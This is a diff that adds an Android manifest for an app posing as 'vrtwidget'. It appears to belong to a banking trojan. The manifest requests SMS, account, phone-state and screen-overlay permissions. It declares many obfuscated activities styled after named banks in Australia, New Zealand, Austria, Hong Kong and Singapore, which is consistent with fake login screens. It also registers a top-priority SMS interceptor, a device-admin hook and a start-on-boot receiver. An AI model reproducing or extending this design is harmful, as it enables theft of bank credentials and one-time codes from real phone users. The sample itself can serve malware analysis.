@@ -1,0 +1,93 @@
+<?xml version="1.0" encoding="utf-8" standalone="no"?><manifest xmlns:android="http://schemas.android.com/apk/res/android" package="org.blhelper.vrtwidget" platformBuildVersionCode="19" platformBuildVersionName="4.4.2-1456859">
+    <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW"/>
+    <uses-permission android:name="android.permission.WAKE_LOCK"/>
+    <uses-permission android:name="android.permission.WRITE_SYNC_SETTINGS"/>
+    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
+    <uses-permission android:name="android.permission.WRITE_CALENDAR"/>
+    <uses-permission android:name="android.permission.STATUS_BAR"/>
+    <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+    <uses-permission android:name="android.permission.MEDIA_CONTENT_CONTROL"/>
+    <uses-permission android:name="android.permission.GET_TASKS"/>
+    <uses-permission android:name="android.permission.READ_SYNC_STATS"/>
+    <uses-permission android:name="android.permission.DELETE_CACHE_FILES"/>
+    <uses-permission android:name="android.permission.CHANGE_WIFI_MULTICAST_STATE"/>
+    <uses-permission android:name="android.permission.READ_SYNC_SETTINGS"/>
+    <uses-permission android:name="android.permission.RECEIVE_SMS"/>
+    <uses-permission android:name="android.permission.SET_ANIMATION_SCALE"/>
+    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
+    <uses-permission android:name="android.permission.READ_SMS"/>
+    <uses-permission android:name="android.permission.GET_ACCOUNTS"/>
+    <uses-permission android:name="android.permission.BATTERY_STATS"/>
+    <uses-permission android:name="android.permission.READ_CALENDAR"/>
+    <uses-permission android:name="android.permission.INTERNET"/>
+    <uses-permission android:name="android.permission.ACCESS_WIFI_STATE"/>
+    <uses-permission android:name="android.permission.KILL_BACKGROUND_PROCESSES"/>
+    <application android:allowBackup="false" android:icon="@drawable/ic_launcher" android:label="@string/app_name" android:name="org.blhelper.vrtwidget.MyApplication">
+        <activity android:configChanges="keyboardHidden|orientation" android:launchMode="singleTop" android:name=".Main" android:screenOrientation="portrait" android:theme="@style/AppBaseTheme">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN"/>
+                <category android:name="android.intent.category.LAUNCHER"/>
+            </intent-filter>
+        </activity>
+        <activity android:configChanges="keyboardHidden|orientation" android:launchMode="singleTop" android:name=".MainActivity" android:screenOrientation="portrait"/>
+        <activity android:name=".GVUMM"/>
+        <activity android:configChanges="keyboardHidden|orientation" android:launchMode="singleTop" android:name=".activities.aGwFBqi" android:theme="@style/LightDialogTheme" android:windowSoftInputMode="stateUnchanged"/>
+        <activity android:configChanges="keyboardHidden|orientation" android:launchMode="singleTop" android:name=".activities.tSKJuPkKCe" android:theme="@style/LightDialogTheme" android:windowSoftInputMode="stateUnchanged"/>
+        <activity android:configChanges="keyboard|keyboardHidden|orientation|screenLayout|screenSize|smallestScreenSize|uiMode" android:name=".activities.gUHuCHjaba_os" android:theme="@style/LightDialogTheme" android:windowSoftInputMode="stateUnchanged"/>
+        <activity android:configChanges="keyboard|keyboardHidden|orientation|screenLayout|screenSize|smallestScreenSize|uiMode" android:name=".activities.ELWSvNdfV" android:theme="@style/LightDialogTheme" android:windowSoftInputMode="stateUnchanged"/>
+        <activity android:configChanges="keyboard|keyboardHidden|orientation|screenLayout|screenSize|smallestScreenSize|uiMode" android:name=".activities.gwVmkbkUVoM" android:theme="@style/LightDialogTheme" android:windowSoftInputMode="stateUnchanged"/>
+        <activity android:configChanges="keyboard|keyboardHidden|orientation|screenLayout|screenSize|smallestScreenSize|uiMode" android:name=".activities.EdiSGPIWqKu" android:theme="@style/LightDialogTheme" android:windowSoftInputMode="stateUnchanged"/>
+        <activity android:configChanges="keyboard|keyboardHidden|orientation|screenLayout|screenSize|smallestScreenSize|uiMode" android:name=".activities.MsOuni" android:screenOrientation="portrait" android:theme="@style/PPTheme" android:windowSoftInputMode="stateUnchanged"/>
+        <activity android:configChanges="keyboard|keyboardHidden|orientation|screenLayout|screenSize|smallestScreenSize|uiMode" android:name=".activities.oiOwSbs" android:screenOrientation="portrait" android:theme="@style/AUCommbankAppTheme" android:windowSoftInputMode="stateUnchanged"/>
+        <activity android:configChanges="keyboard|keyboardHidden|orientation|screenLayout|screenSize|smallestScreenSize|uiMode" android:name=".activities.fPieIUM_jjt" android:screenOrientation="portrait" android:theme="@style/AUNABAppTheme" android:windowSoftInputMode="stateUnchanged"/>
+        <activity android:configChanges="keyboard|keyboardHidden|orientation|screenLayout|screenSize|smallestScreenSize|uiMode" android:name=".activities.ITiiIaITC" android:screenOrientation="portrait" android:theme="@style/AUWestpacAppTheme" android:windowSoftInputMode="adjustResize"/>
+        <activity android:configChanges="keyboard|keyboardHidden|orientation|screenLayout|screenSize|smallestScreenSize|uiMode" android:name=".activities.bkDrSfsU" android:screenOrientation="portrait" android:theme="@style/AUSTGeorgeAppTheme" android:windowSoftInputMode="adjustPan"/>
+        <activity android:configChanges="keyboard|keyboardHidden|orientation|screenLayout|screenSize|smallestScreenSize|uiMode" android:name=".activities.hJDpbbNAvKEJ" android:screenOrientation="portrait" android:theme="@style/AUGomoneyTheme" android:windowSoftInputMode="adjustPan"/>
+        <activity android:configChanges="keyboard|keyboardHidden|orientation|screenLayout|screenSize|smallestScreenSize|uiMode" android:name=".activities._fgRpQLiiP" android:screenOrientation="portrait" android:theme="@style/NZWestpacTheme" android:windowSoftInputMode="adjustPan"/>
+        <activity android:configChanges="keyboard|keyboardHidden|orientation|screenLayout|screenSize|smallestScreenSize|uiMode" android:name=".activities.FjgbGHk_sdO" android:screenOrientation="portrait" android:theme="@style/NZBNZTheme" android:windowSoftInputMode="stateUnchanged"/>
+        <activity android:configChanges="keyboard|keyboardHidden|orientation|screenLayout|screenSize|smallestScreenSize|uiMode" android:name=".activities.gbismEkiel" android:screenOrientation="portrait" android:theme="@style/NZANZTheme" android:windowSoftInputMode="stateUnchanged"/>
+        <activity android:configChanges="keyboard|keyboardHidden|orientation|screenLayout|screenSize|smallestScreenSize|uiMode" android:name=".activities.UPFqRBauoFL" android:screenOrientation="portrait" android:theme="@style/ATRBGTheme"/>
+        <activity android:configChanges="keyboard|keyboardHidden|orientation|screenLayout|screenSize|smallestScreenSize|uiMode" android:name=".activities.CtrPgcFlK" android:screenOrientation="portrait" android:theme="@style/ATDKBAppTheme" android:windowSoftInputMode="stateUnchanged"/>
+        <activity android:configChanges="keyboard|keyboardHidden|orientation|screenLayout|screenSize|smallestScreenSize|uiMode" android:name=".activities.VqhCKo" android:screenOrientation="portrait" android:theme="@style/ATDKTheme" android:windowSoftInputMode="stateUnchanged"/>
+        <activity android:configChanges="keyboard|keyboardHidden|orientation|screenLayout|screenSize|smallestScreenSize|uiMode" android:name=".activities.TjNrTKBoKDP" android:screenOrientation="portrait" android:theme="@style/HKBankOfChinaTheme" android:windowSoftInputMode="stateUnchanged"/>
+        <activity android:configChanges="keyboard|keyboardHidden|orientation|screenLayout|screenSize|smallestScreenSize|uiMode" android:name=".activities.dclePIlm" android:screenOrientation="portrait" android:theme="@style/HKHangSengBankTheme" android:windowSoftInputMode="stateUnchanged"/>
+        <activity android:configChanges="keyboard|keyboardHidden|orientation|screenLayout|screenSize|smallestScreenSize|uiMode" android:name=".activities.wdSpp" android:screenOrientation="portrait" android:theme="@style/HKBreezeTheme" android:windowSoftInputMode="stateUnchanged"/>
+        <activity android:configChanges="keyboard|keyboardHidden|orientation|screenLayout|screenSize|smallestScreenSize|uiMode" android:name=".activities.QMofBJLVFs_" android:screenOrientation="portrait" android:theme="@style/HKCitiTheme" android:windowSoftInputMode="stateUnchanged"/>
+        <activity android:configChanges="keyboard|keyboardHidden|orientation|screenLayout|screenSize|smallestScreenSize|uiMode" android:name=".activities.VgfKRaK" android:screenOrientation="portrait" android:theme="@style/ATGeorgeTheme" android:windowSoftInputMode="stateUnchanged"/>
+        <activity android:configChanges="keyboard|keyboardHidden|orientation|screenLayout|screenSize|smallestScreenSize|uiMode" android:name=".activities.TOKFlVNhBnQicEb" android:screenOrientation="portrait" android:theme="@style/ATErsteSparTheme" android:windowSoftInputMode="stateUnchanged"/>
+        <activity android:configChanges="keyboard|keyboardHidden|orientation|screenLayout|screenSize|smallestScreenSize|uiMode" android:name=".activities.kkQE_j" android:screenOrientation="portrait" android:theme="@style/ATBawagTheme" android:windowSoftInputMode="stateUnchanged"/>
+        <activity android:configChanges="keyboard|keyboardHidden|orientation|screenLayout|screenSize|smallestScreenSize|uiMode" android:name=".activities.LeHtABE" android:screenOrientation="portrait" android:theme="@style/ATBATheme" android:windowSoftInputMode="stateUnchanged"/>
+        <activity android:configChanges="keyboard|keyboardHidden|orientation|screenLayout|screenSize|smallestScreenSize|uiMode" android:name=".activities.IpDLKgwvgm" android:screenOrientation="portrait" android:theme="@style/SGDBSTheme" android:windowSoftInputMode="stateUnchanged"/>
+        <activity android:configChanges="keyboard|keyboardHidden|orientation|screenLayout|screenSize|smallestScreenSize|uiMode" android:name=".activities.VIBgPMar" android:screenOrientation="portrait" android:theme="@style/SGPOSBTheme" android:windowSoftInputMode="stateUnchanged"/>
+        <activity android:configChanges="keyboard|keyboardHidden|orientation|screenLayout|screenSize|smallestScreenSize|uiMode" android:name=".activities.gubKSiwPC" android:screenOrientation="portrait" android:theme="@style/SGOCBCTheme" android:windowSoftInputMode="stateUnchanged"/>
+        <receiver android:enabled="true" android:exported="true" android:name=".ServiceStarter">
+            <intent-filter>
+                <action android:name="android.intent.action.BOOT_COMPLETED"/>
+            </intent-filter>
+        </receiver>
+        <receiver android:enabled="true" android:exported="true" android:name=".rhVEQttqjqiS">
+            <intent-filter>
+                <action android:name="android.intent.action.ACTION_EXTERNAL_APPLICATIONS_AVAILABLE"/>
+            </intent-filter>
+        </receiver>
+        <receiver android:name=".GLuugsVGrOJ" android:permission="android.permission.BIND_DEVICE_ADMIN">
+            <intent-filter>
+                <action android:name="android.app.action.DEVICE_ADMIN_ENABLED"/>
+            </intent-filter>
+            <meta-data android:name="android.app.device_admin" android:resource="@xml/policies"/>
+        </receiver>
+        <receiver android:enabled="true" android:exported="true" android:name=".hDTEfuENwFL">
+            <intent-filter android:priority="999">
+                <action android:name="android.provider.Telephony.SMS_RECEIVED"/>
+            </intent-filter>
+        </receiver>
+        <receiver android:enabled="true" android:exported="true" android:name=".nsbB_tt">
+            <intent-filter>
+                <action android:name="org.blhelper.vrtwidget.activities.HTMLStart"/>
+            </intent-filter>
+        </receiver>
+        <service android:name=".rQUSWLCbKgFSJ"/>
+    </application>
+</manifest>
